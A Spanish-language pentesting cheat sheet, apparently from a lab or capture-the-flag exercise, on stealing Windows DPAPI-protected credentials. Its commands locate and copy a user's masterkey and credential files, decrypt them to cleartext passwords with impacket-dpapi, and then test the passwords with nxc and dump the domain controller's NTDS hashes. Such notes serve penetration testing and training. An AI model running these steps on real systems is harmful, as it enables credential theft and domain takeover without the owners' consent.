# DPAPI (Data Protection API)

Tags: #Windows #PrivEsc #DPAPI #Kali 

Es una API de Windows que encripta/desencripta datos usando credenciales del usuario actual.

* [DPAPI - HackTricks](https://hacktricks.wiki/es/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)

**En pentesting es vulnerable porque:**
1. **Las credenciales están almacenadas encriptadas con DPAPI** - navegadores, VPN clients, aplicaciones guardan contraseñas encriptadas con DPAPI
2. **Solo el usuario propietario puede desencriptarlas** - pero si tienes acceso como ese usuario, las recuperas
3. **Herramienta: Mimikatz** - puede extraer y desencriptar datos DPAPI

## Recursos 
Lo enumeras con WinPEAS.
* [WinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
* [Releases](https://github.com/peass-ng/PEASS-ng/releases) → descargar binarios precompilados

## Explotación 

```powershell 
Paso 1:
# Obtener la Masterkey desde WinPEAS
❯ C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407

	# sid = S-1-5-21-1487982659-1829050783-2281216199-1107
Es un archivo con ese nombre el cual se puede renombrar asi:
	# masterkey_blob = 556a2412-1275-4ccf-b721-e6a0b4f90407

Paso 2:
# Obtener la ruta de los 'CredFile' desde WinPEAS
❯ C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

Es un archivo con ese nombre el cual se puede renombrar asi:
	# credential_blob = C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

```bash 
Paso 3:
# Descargar los archivos a Kali renombrados 
❯ copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 x:\masterkey_blob

❯ copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 x:\credential_blob
```

```bash 
Paso 4:
# Derivar la clave que cifra la masterkey para descifrar el contenido de los CredFile
❯ impacket-dpapi masterkey -file <masterkey_blob> -sid <sid>
	# La contraseña que solicita al ejecutar el comando es del usuario controlado que tiene dpapi

Resultado:
	key = 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```bash 
Paso 5:
# Descifrar los 'CredFile' y obtener el usuario y su password en texto claro 
❯ impacket-dpapi credential -file <credential_blob> -key <key>
```

```bash 
Paso 6:
# Verificar las credenciales 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 
❯ nxc winrm IP_DC -u user -p 'P@$$w0rd123!' 

❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' -ntds 
```